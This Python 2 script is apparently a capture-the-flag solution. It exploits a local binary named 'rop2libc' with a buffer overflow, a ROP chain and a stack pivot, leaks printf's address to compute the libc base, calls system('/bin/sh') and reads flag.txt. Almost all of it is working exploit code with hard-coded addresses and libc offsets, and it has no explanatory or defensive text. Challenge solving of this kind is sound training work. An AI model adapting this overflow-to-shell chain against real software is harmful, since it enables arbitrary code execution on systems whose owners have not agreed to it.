#!/usr/bin/python
import os
import subprocess, time
import pty
import struct

# Create the process
master, slave = pty.openpty()
process = subprocess.Popen(["./rop2libc"], stdin=subprocess.PIPE, stdout=slave)
sout = os.fdopen(master, "r")

# Send the initial overflow and read result
print("Sending first overflow")
process.stdin.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x6c\xa8\x04\x08\x53\x84\x04\x08\n")
time.sleep(1)
print(sout.readline())

# Send the stack pivot and read result
print("Sending stack pivot")
process.stdin.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x74\xa8\x04\x08\x71\x84\x04\x08\x84\xa8\x04\x08\x65\x84\x04\x08STRR\x0c\xa0\x04\x08\x8c\xa8\x04\x08\x53\x84\x04\x08\n")
time.sleep(1)
print(sout.readline())
leak = sout.readline()

# Get the libc base
leak = leak.replace("You said: ","")
printf_addr = struct.unpack("<I", leak[0:4])[0]
libc_base = printf_addr - 0x4cc40
print(hex(libc_base))

# Calculate the system() and "/bin/sh" addresses
system_addr = libc_base + 0x3fcd0
#binsh_addr = 0x0804a824
binsh_addr = libc_base + 0x15DA84
#system_addr = printf_addr
#binsh_addr = 0x8048520 + 11

# Send the system() call
print("Running system()")
process.stdin.write("AAAA" + struct.pack("<I", system_addr) + "CCCC" + struct.pack("<I", binsh_addr) + "\n")
time.sleep(1)
#print(sout.readline())

# Send command
print("Sending command")
process.stdin.write("cat flag.txt\n")
time.sleep(1)
print(sout.readline())
